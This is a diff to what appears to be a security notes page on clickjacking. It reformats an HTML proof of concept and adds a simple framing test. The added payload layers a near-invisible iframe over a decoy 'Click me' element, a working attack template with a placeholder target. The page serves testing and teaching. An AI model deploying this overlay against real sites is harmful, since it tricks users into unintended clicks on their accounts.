@@ -11,15 +11,28 @@ Interface-based attack in which a user is tricked into clicking on actionable co
 {% code lineNumbers="true" %}
 ```html
 <!DOCTYPE html>
-<html><head>
-<title> Clickjacking </title></head>
-<body><h1>Vulnerable to Clickjacking</h1>
-<style>iframe {position:relative;width:750px;height: 550px;opacity: 0.0001;z-index: 2;}
-div {position:absolute;top:500px;left:60px;z-index: 1;}
-</style>
-<div>Click me</div>
-<iframe src="https://URL"></iframe>
-</body></html><head>
+<html>
+	<head>
+		<title> Clickjacking </title>
+	</head>
+	<body>
+		<h1>Vulnerable to Clickjacking</h1>
+		<iframe src="https://url/" width="1000px" height="750px"></iframe>
+	</body>
+</html>
+
+<!DOCTYPE html>
+<html>
+	<head>
+		<title> Clickjacking </title></head>
+	<body><h1>Vulnerable to Clickjacking</h1>
+		<style>iframe {position:relative;width:750px;height: 550px;opacity: 0.0001;z-index: 2;}
+		div {position:absolute;top:500px;left:60px;z-index: 1;}
+		</style>
+		<div>Click me</div>
+		<iframe src="https://URL"></iframe>
+	</body>
+</html>
 ```
 {% endcode %}
 
